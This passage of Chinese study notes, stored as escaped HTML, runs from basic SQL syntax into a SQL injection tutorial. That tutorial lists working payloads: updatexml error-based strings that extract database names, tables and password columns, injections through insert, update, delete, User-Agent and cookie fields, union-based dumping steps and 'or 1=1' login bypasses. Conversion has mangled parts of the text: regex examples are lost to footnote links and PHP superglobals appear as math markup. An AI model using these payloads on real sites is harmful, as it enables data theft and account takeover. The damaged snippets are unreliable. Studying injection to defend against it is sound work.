where name regexp ‘&lt;sup class=&#34;footnote-ref&#34;&gt;&lt;a href=&#34;#fn1&#34; id=&#34;fnref1&#34;&gt;[1]&lt;/a&gt;&lt;/sup&gt;’;&lt;br&gt;
 下面的 SQL 语句选取 name 以 A 到 H 字母开头的网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where name regexp ‘&lt;sup class=&#34;footnote-ref&#34;&gt;&lt;a href=&#34;#fn2&#34; id=&#34;fnref2&#34;&gt;[2]&lt;/a&gt;&lt;/sup&gt;’;&lt;br&gt;
 下面的 SQL 语句选取 name 不以 A 到 H 字母开头的网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where name regexp ‘&lt;sup&gt;[&lt;/sup&gt;A-H]’;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;in 操作符&lt;br&gt;
 in 操作符允许您在 where 子句中规定多个值。&lt;br&gt;
语法:&lt;br&gt;
select column_name(s)&lt;br&gt;
from table_name&lt;br&gt;
where column_name in (value1,value2,…);&lt;br&gt;
 下面的 SQL 语句选取 name 为 “Google” 或 “菜鸟教程” 的所有网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where name in (‘Google’,‘菜鸟教程’);&lt;/li&gt;
&lt;li&gt;between 操作符&lt;br&gt;
 between 操作符用于选取介于两个值之间的数据范围内的值。&lt;br&gt;
语法:&lt;br&gt;
select column_name(s)&lt;br&gt;
from table_name&lt;br&gt;
where column_name between value1 AND value2;&lt;br&gt;
 下面的 SQL 语句选取 alexa 介于 1 和 20 之间的所有网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where alexa between 1 and 20;&lt;br&gt;
 如需显示不在上面实例范围内的网站，请使用 NOT BETWEEN：&lt;br&gt;
select * from Websites&lt;br&gt;
where alexa not between 1 and 20;&lt;/li&gt;
&lt;li&gt;别名&lt;br&gt;
通过使用 SQL，可以为表名称或列名称指定别名。&lt;br&gt;
语法：&lt;br&gt;
列：&lt;br&gt;
select column_name as alias_name&lt;br&gt;
from table_name;&lt;br&gt;
 表：&lt;br&gt;
select column_name(s)&lt;br&gt;
from table_name as alias_name;&lt;/li&gt;
&lt;li&gt;连接 (join)&lt;br&gt;
 join 用于把来自两个或多个表的行结合起来。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;inner join：如果表中有至少一个匹配，则返回行&lt;br&gt;
在表中存在至少一个匹配时返回行。&lt;br&gt;
语法:&lt;br&gt;
select column_name(s)&lt;br&gt;
from table1&lt;br&gt;
inner join table2&lt;br&gt;
on table1.column_name=table2.column_name;&lt;br&gt;
 或：&lt;br&gt;
select column_name(s)&lt;br&gt;
from table1&lt;br&gt;
join table2&lt;br&gt;
on table1.column_name=table2.column_name;&lt;br&gt;
left join：即使右表中没有匹配，也从左表返回所有的行&lt;br&gt;
从左表（table1）返回所有的行，即使右表（table2）中没有匹配。如果右表中没有匹配，则结果为 NULL。&lt;br&gt;
语法&lt;br&gt;
 select column_name (s)&lt;br&gt;
from table1&lt;br&gt;
left join table2&lt;br&gt;
on table1.column_name=table2.column_name;&lt;br&gt;
 或：&lt;br&gt;
select column_name(s)&lt;br&gt;
from table1&lt;br&gt;
left outer  join table2&lt;br&gt;
on table1.column_name=table2.column_name;&lt;br&gt;
right join：即使左表中没有匹配，也从右表返回所有的行&lt;br&gt;
从右表（table2）返回所有的行，即使左表（table1）中没有匹配。如果左表中没有匹配，则结果为 NULL。&lt;br&gt;
语法&lt;br&gt;
 select column_name (s)&lt;br&gt;
from table1&lt;br&gt;
right join table2&lt;br&gt;
on table1.column_name=table2.column_name;&lt;br&gt;
 或：&lt;br&gt;
select column_name(s)&lt;br&gt;
from table1&lt;br&gt;
right outer join table2&lt;br&gt;
on table1.column_name=table2.column_name;&lt;br&gt;
full join：只要其中一个表中存在匹配，则返回行&lt;br&gt;
只要左表（table1）和右表（table2）其中一个表中存在匹配，则返回行.&lt;br&gt;
 关键字结合了 left join 和 right join 的结果。&lt;br&gt;
语法&lt;br&gt;
 select column_name (s)&lt;br&gt;
from table1&lt;br&gt;
full outer join table2&lt;br&gt;
on table1.column_name=table2.column_name;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;union 操作符&lt;br&gt;
 union 操作符合并两个或多个 SELECT 语句的结果。&lt;br&gt;
注意: union 内部的每个 select 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。&lt;br&gt;
语法：&lt;br&gt;
select column_name(s) from table1&lt;br&gt;
union&lt;br&gt;
select column_name(s) from table2;&lt;br&gt;
 注释：默认地，union 操作符选取不同的值。如果允许重复的值，请使用 union all。&lt;/li&gt;
&lt;li&gt;select into 语句&lt;br&gt;
通过 SQL，您可以从一个表复制信息到另一个表。&lt;br&gt;
select into 语句从一个表复制数据，然后把数据插入到另一个新表中。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;span id=&#34;sql注入原因-危害以及步骤&#34;&gt; （SQL）注入原因、危害以及步骤&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;为什么存在 sql 注入&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;语言分类：解释型语言和编译型语言。&lt;br&gt;
解释型语言：是一种在运行时由一个运行时组件解释语言代码并执行其中包含指令的语言&lt;br&gt;
编译型语言：代码在生成时转化为机器指令，然后在运行时直接由使用该语言的计算机执行这些命令&lt;br&gt;
在解释型语言中，如果程序与用户进行交互。用户就可以构造特殊的输入来拼接到程序中执行，从而使得程序依据用户输入执行可能存在恶意行为的代码&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;可控变量，带入数据库查询，变量未存在过滤或过滤不严谨&lt;br&gt;
注入产生的原因是接受相关参数未经过滤直接带入数据库查询操作。&lt;br&gt;
SQL 注入：服务器端未严格校验客户端发送的数据，而导致服务端 SQL 语句被恶意修改并成功执行&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;会产生 SQL 注入原因：&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;代码对带入 SQL 语句的参数过滤不严格&lt;/li&gt;
&lt;li&gt;未启用框架的安全配置&lt;/li&gt;
&lt;li&gt;未使用框架安全的查询方法&lt;/li&gt;
&lt;li&gt;测试接口未删除&lt;/li&gt;
&lt;li&gt;未启用防火墙&lt;/li&gt;
&lt;li&gt;未使用其他安全的防护设备&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;SQL 注入危害：&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;登录功能：数据库信息泄露，数据库存放的用户隐私信息泄露&lt;/li&gt;
&lt;li&gt;搜索功能：网页篡改；网页被挂马，传播恶意软件；修改数据库一些字段的值，嵌入网马链接，进行挂马攻击&lt;/li&gt;
&lt;li&gt;详情页：数据库被恶意操作；数据库服务器被攻击；数据库系统管理员账户被篡改&lt;/li&gt;
&lt;li&gt;商品购买：服务器被远程控制&lt;br&gt;
总结：任何和数据库产生交互的地方都会存在注入&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;注入的一般步骤：&lt;br&gt;
(1) SQL 注入点探测。通过适当的分析应用程序可以判断什么地方存在 SQL 注入点。通常只要带有输入提交的动态网页并且动态网页访问数据库就可能存在 SQL 注入漏洞&lt;br&gt;
 (2) 收集后台数据库信息。由于不同的数据库注入方法、函数都不一样，所以在注入之前要先判断数据库类型。&lt;br&gt;
(3) 猜解用户名和密码。数据库中的表和字段命名一般都是有规律的，通过构造特殊的 SQL 语句在数据库中一次猜解出表名、字段名、字段数、用户名和密码。&lt;br&gt;
(4) 查找 Web 后台管理入口。WEB 后台管理通常不对普通用户开放，要找到后台管理的登录网址，可以利用 Web 目录扫描工具（如：wwwscan、AWVS）快速搜索到可能的登录地址，然后逐一尝试，便可以找到后台管理平台的登录网址。&lt;br&gt;
(5) 入侵和破坏。&lt;/li&gt;
&lt;li&gt;注入的分类&lt;br&gt;
按照请求方法分类：&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;GET 型注入&lt;/li&gt;
&lt;li&gt;POST 型注入&lt;br&gt;
按照数据类型分类：&lt;/li&gt;
&lt;li&gt;整型注入&lt;/li&gt;
&lt;li&gt;字符型注入&lt;br&gt;
其他类型：&lt;/li&gt;
&lt;li&gt;报错注入&lt;/li&gt;
&lt;li&gt;双注入&lt;/li&gt;
&lt;li&gt;时间盲注&lt;/li&gt;
&lt;li&gt;Cookie 注入&lt;/li&gt;
&lt;li&gt;User-Agent 注入&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;常用的系统函数&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;version ()-------MySQL 版本&lt;/li&gt;
&lt;li&gt;user ()--------- 数据库用户名&lt;/li&gt;
&lt;li&gt;database ()--------- 数据库名&lt;/li&gt;
&lt;li&gt;@@datadir-------- 数据库路径&lt;/li&gt;
&lt;li&gt;@@version_compile_os-------- 操作系统版本&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;字符串连接函数&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;concat (str1,str2,…)------- 没有分隔符的连接字符串&lt;/li&gt;
&lt;li&gt;concat_ws (separator,str1,str2,…)----- 含有分隔符的连接字符串&lt;/li&gt;
&lt;li&gt;group_concat (str1,str2,…)------ 连接一个组的所有字符串，并以逗号分隔每一条数据&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;span id=&#34;sql注入的一般方法&#34;&gt; （sql）注入的一般方法&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;(1) 联合查询 union 注入：&lt;br&gt;
使用联合查询进行注入的前提是我们要进行注入的页面必须有显示位。&lt;br&gt;
所谓联合查询注入即是使用 union 合并两个或多个 SELECT 语句的结果集，所以两个及以上的 select 必须有相同列、且各列的数据类型也都相同，同时，每条 SELECT 语句中的列的顺序必须相同。联合查询可先在链接最后添加 order by X 基于随意数字的注入，根据页面的返回结果来判断站点中的字段数目。&lt;br&gt;
查询的字段必须等于主查询的字段，这个时候可以在 SQL 语句后面加 order by 进行排序，通过这个办法可以判断主查询的字段。&lt;br&gt;
(2) information_schema 注入：&lt;br&gt;
information_schema 数据库是 MySQL5.0 系统自带的数据库。其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。&lt;br&gt;
通过 information_schema 注入，我们可以将整个数据库内容全部窃取出来。&lt;br&gt;
(3) 基于报错信息注入:&lt;br&gt;
 此方法是在页面没有显示位，但是 echomysql_error (); 函数，在前端输出了错误信息的时候方能使用。&lt;br&gt;
优点是注入速度快，缺点是语句较为复杂，而且只能用 limit 依次进行猜解。总体来说，报错注入其实是一种公式化的注入方法，主要用于在页面中没有显示位，但是用 echomysql_error (); 输出了错误信息时使用。常见的 select/insert/update/delete 注入都可以使用报错方式来获取信息。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;三个常用的用来报错的函数&lt;br&gt;
 updatexml（）: 函数是 MYSQL 对 XML 文档数据进行查询和修改的 XPATH 函数&lt;br&gt;
 extractvalue（） : 函数也是 MYSQL 对 XML 文档数据进行查询的 XPATH 函数.&lt;br&gt;
floor（）: MYSQL 中用来取整的函数.&lt;/li&gt;
&lt;li&gt;基于报错的信息获取：&lt;br&gt;
updatexml (XML_document, XPath_string, new_value);&lt;br&gt;
 第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc&lt;br&gt;
 第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。&lt;br&gt;
第三个参数：new_value，String 格式，替换查找到的符合条件的数据&lt;br&gt;
 k’ and updatexml (1,concat (0x7e,(SELECT @@version),0x7e),1) #  爆数据库版本信息&lt;br&gt;
 k’ and updatexml (1,concat (0x7e,(SELECT user ()),0x7e),1)#  爆数据库当前用户&lt;br&gt;
 k’ and updatexml (1,concat (0x7e,(SELECT database ()),0x7e),1) #  爆数据库&lt;br&gt;
 k’ and updatexml (1,concat (0x7e,(select table_name from information_schema.tables where table_schema=‘数据库名’limit 0,1)),0)#，但是反馈回的错误表示只能显示一行，所以采用 limit 来一行一行显示  爆表名&lt;br&gt;
 k’ and updatexml (1,concat (0x7e,(select column_name from information_schema.columns where table_name=‘users’limit 2,1)),0)#  爆字段&lt;br&gt;
 k’ and updatexml (1,concat (0x7e,(select password from users limit 0,1)),0)#  爆值&lt;br&gt;
 (4) insert 注入、update 注入 、dalete 注入 、Http Header 注入 、Cookie 注入&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;1、insert 注入：注册的信息，没有经过过滤直接带到数据库中，导致 insert 注入。&lt;br&gt;
注入方法 payload：a’ or updatexml (1,concat (0x7e,(命令)),0) or’&lt;br&gt;
①. 爆表名&lt;br&gt;
 a’or updatexml (1,concat (0x7e,(select table_name from information_schema.tables where table_schema=‘pikachu’ limit 0,1)),0) or’&lt;br&gt;
②. 爆列名&lt;br&gt;
 a’ or updatexml (1,concat (0x7e,(select column_name from   information_schema.columns where table_name=‘users’limit 2,1)),0) or’&lt;br&gt;
③. 爆内容&lt;br&gt;
 a’ or updatexml (1,concat (0x7e,(select password from users limit 0,1)),0) or’等同于&lt;br&gt;
 a’ or updatexml (1,concat (0x7e,(select password from users limit 0,1)),0) or ‘1’=‘1’’&lt;/p&gt;
&lt;p&gt;2、update 注入：用户登陆端，没有经过过滤直接带到数据库中，导致 update 注入。&lt;br&gt;
a’ or updatexml(0,concat(0x7e,(database())),0) or’&lt;/p&gt;
&lt;p&gt;3、dalete 注入：应用于前后端发贴、留言、用户等相关删除操作时抓包。&lt;br&gt;
delete from message where id=56 or updatexml(2,concat(0x7e,(database())),0)&lt;/p&gt;
&lt;p&gt;4、Http Header 注入：数据库直接获取了前端的头信息没有做任何的处理导致注入。&lt;br&gt;
在 User-Agent 输入 Mozilla &#39;or updatexml (1,concat (0x7e,database ()),0) or ’&lt;/p&gt;
&lt;p&gt;5、Cookie 注入：后端获取 Cookie 直接在数据库中进行拼接，那这也是一个 SQL 注入点。&lt;br&gt;
注入方法 ：在 ant [uname]=admin 后添加一个’观察反馈的 MYSQL 的语法报错，发现了存在 SQL 注入漏洞后，再插入 &#39;and updatexml (1,concat (0x7e,database ()),0)#&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SQL 注入总结：&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;判断是否注入 (是否严格校验)&lt;br&gt;
(1) 可控参数 (id) 能否影响页面显示&lt;br&gt;
 (2) 输入的 SQL 语句是否能报错 (能通过数据库报错，看到数据库一些语句痕迹)(select username,password from user where id = ?’ ) 后面单引号或者双引号&lt;br&gt;
通过在 URL 中修改对应的 id 值，值为正常数字、大数字、字符 (单引号、双引号、双单引号、括号)、反斜杠 \ 来探测 URL 中是否存在注入点&lt;br&gt;
 (3) 输入的 SQL 语句能否不报错 (我们的语句能够成功闭合) (select username,password from user where id = ‘?’ #‘limite 0,1’)&lt;/li&gt;
&lt;li&gt;什么类型的注入&lt;/li&gt;
&lt;li&gt;语句能否被恶意修改 (select username,password from user where id = ‘?’ and 0 #)&lt;/li&gt;
&lt;li&gt;是否能够成功执行&lt;/li&gt;
&lt;li&gt;获取我们想要的注入&lt;br&gt;
数据库 -&amp;gt; 表 -&amp;gt; 字段 -&amp;gt; 值&lt;br&gt;
抓包找出万能密码  (找出具体是哪种后台语言，确定万能密码)&lt;br&gt;
 CMS 逻辑&lt;br&gt;
 index.php 首页展示内容，具有文章列表 (链接具有文章 id)，article.php 文章详细页，URL 中 article.php?id = 文章 id 读取 id 文章&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;注入提交方式 (get post cookie)&lt;br&gt;
 ASP：request （全部接受）、request.querystring （接受 get）、request.form （接受 post）、 request.cookie cookie （接受 cookie）&lt;br&gt;
PHP: &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mi&gt;U&lt;/mi&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mtext&gt;（全部接受）、&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_REQUEST（全部接受）、&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;U&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;（&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;全&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;部&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;接&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;受&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;）&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;、&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_GET（接受 get）、 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mtext&gt;（接受&lt;/mtext&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mtext&gt;）、&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_POST （接受post）、&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;（&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;接&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;受&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;）&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;、&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_COOKIE（接受 cookie）&lt;/li&gt;
&lt;li&gt;一般用于尝试的语句 (也就是根据 sql 语句，运用逻辑判断反馈结果得到判断类型)&lt;br&gt;
 Ps:–+ 可以用 #替换，url 提交过程中 Url 编码后的 #为 %23&lt;br&gt;
or 1=1–+&lt;br&gt;
&#39;or 1=1–+&lt;br&gt;
&amp;quot;or 1=1–+&lt;br&gt;
)or 1=1–+&lt;br&gt;
&#39;)or 1=1–+&lt;br&gt;
&amp;quot;) or 1=1–+&lt;br&gt;
&amp;quot;))or 1=1–+&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;span id=&#34;不再显示错误的盲注&#34;&gt; 不再显示错误的盲注&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;Blind sql (盲注) 是注入攻击的一种，向数据库发送 true 或 false 这样的问题，并根据应用程序返回的信息判断结果，这种攻击的出现是因为应用程序配置为只显示常规错误，但并没有解决 SQL 注入存在的代码问题&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;登录型&#34;&gt; 登录型&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;登录 SQL 语句：select * from admin where username = &#39; 用户输入的用户名’and password = ‘用户输入的密码’’&lt;br&gt;
登录 SQL 语句：select * from admin where username = &#39; 用户输入的用户名‘ and password =‘用户输入的密码’&lt;br&gt;
用户输入的内容可由用户自行控制，例如可以输入 数字’or 1 = 1 -- 空格 (%20 也表示空格或者 + 或者 #)&lt;br&gt;
 SQL 语句：select * from admin where username =‘数字’ or 1=1 --&#39;and password =‘用户输入的密码’&lt;br&gt;
其中 or 1=1 永远为真，–注释后面内容不再执行，因此 SQL 语句执行会返回 admin 表中的所有内容&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;数字型注入&#34;&gt; 数字型注入&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;概念&lt;br&gt;
当输入的参数为整型时，如 ID、年龄、页码等，如果存在注入漏洞，则可以认为是数字型注入。这种数字型注入最多出现在 ASP、PHP 等弱类型语言中，弱类型语言会自动推导变量类型，例如，参数 id=8，PHP 会自动推导变量 id 的数据类型为 int 类型，那么 id=8 and 1=1，则会推导为 string 类型，这是弱类型语言的特性。而对于 Java、C# 这类强类型语言，如果试图把一个字符串转换为 int 类型，则会抛出异常，无法继续执行。所以，强类型的语言很少存在数字型注入漏洞。&lt;br&gt;
数字型：select * from table where id =$id&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断：&lt;br&gt;
这种类型可以使用经典的 and 1=1 和 and 1=2 来判断：&lt;br&gt;
select * from &amp;lt;表名&amp;gt; where id = 1 and 1=1   (true)&lt;br&gt;
 select * from &amp;lt;表名&amp;gt; where id = 1 and 1=2   (false)&lt;br&gt;
 字符型：&lt;br&gt;
select * from &amp;lt;表名&amp;gt; where id = ‘1 and 1=1’&lt;br&gt;
select * from &amp;lt;表名&amp;gt; where id = ‘1 and 1=2’&lt;br&gt;
不会进行逻辑判断 (转化为字符型语句，单引号里面就是一团内容)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数字 or 1=1&lt;br&gt;
 举例：&lt;br&gt;
select * from table where id = 1 or 1 = 1&lt;br&gt;
 永为真&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;步骤&lt;/p&gt;
&lt;p&gt;(1) 利用 1 order by 判断字段数&lt;br&gt;
 (2) 显位：联合查询查看显示位&lt;br&gt;
 1 union select 1,2 #&lt;br&gt;
(3) 爆库：显示出数据库名字&lt;br&gt;
 1 union select 1,group_concat (schema_name) from (information_schema.schemata)#&lt;br&gt;
或  所有数据库&lt;br&gt;
 1 union select 1,database ()#  当前数据库&lt;br&gt;
 (4) 爆表：利用 union select 联合查询，获取表名&lt;br&gt;
 1 union select 1,group_concat (table_name) from information_schema.tables where table_schema=database ()#    当前数据库的表&lt;br&gt;
 1 union select1,group_concat (table_name) from (information_schema.tables) where table_schema=‘数据库名字’ #  指定名称数据库的表&lt;br&gt;
 (5) 爆列：利用 union select 联合查询，获取字段名&lt;br&gt;
 1 union select 1,group_concat (column_name) from information_schema.columns where table_schema=database () and table_name=‘表名’ #  当前数据库的指定表名&lt;br&gt;
 1 union select 1,group_concat (column_name) from (information_schema.columns) where table_name=‘表名’ #  在所有数据库中指定一个表名&lt;br&gt;
 (6) 爆值：利用 union select 联合查询，获取字段值&lt;br&gt;
 1 union select 1,group_concat (concat_ws (表名对应的字段名)) from (表名)      在当前数据库中的相应表名的字段值&lt;br&gt;
或&lt;br&gt;
 1 union select 1,group_concat (表名对应的字段名) from (数据库。表名)    在所有数据库中对应表名的字段值&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;span id=&#34;字符型注入&#34;&gt; 字符型注入&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;概念&lt;br&gt;
当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。&lt;br&gt;
字符型：select * from table where id=’$id’&lt;/li&gt;
&lt;li&gt;判断：&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;这种类型我们同样可以使用’ and ‘1’=‘1 和 x’ and ‘1’ = ‘2 来判断：(得知道 username)&lt;br&gt;
 select * from &amp;lt;表名&amp;gt; where id = ‘x’ and ‘1’=‘1’  (true)&lt;br&gt;
 select * from &amp;lt;表名&amp;gt; where id = ‘x’ and ‘1’=‘2’  (false)&lt;br&gt;
select name.passwd from users where username=’  ’ and password=‘   ’&lt;/li&gt;
&lt;li&gt;内容’ or ‘1’=‘1’# 和内容’ or ‘1’=‘2’#&lt;br&gt;
select name.passwd from users where username=’ 内容’ or ‘1’=‘1 ’ and password=‘ 内容  ’&lt;br&gt;
select name.passwd from users where username=’ 内容’ or ‘1’=‘1’# ’ and password=‘ 内容  ’   (true)&lt;br&gt;
 select name.passwd from users where username=’ 内容’ or ‘1’=‘2’# ’ and password=‘ 内容  ’(false)&lt;/li&gt;
&lt;li&gt;内容’ or ‘1’=‘1 和 内容’ or ‘1’=‘2    (得知道 username)&lt;br&gt;
 select name.passwd from users where username=’ 内容’ or ‘1’=‘1 ’ and password=‘ 内容  ’&lt;br&gt;
and 优先级大于 or&lt;br&gt;
（select name.passwd from users where username=‘admin’） or（ ‘1’=‘1’ and password=‘12345’）&lt;br&gt;
所以这里有猜测成分，内容必须为真&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;内容’ or 1=1#&lt;br&gt;
比如传进去 C1everF0x’ or 1=1#，结果就是 ‘C1everF0x’ or 1=1#’，&lt;br&gt;
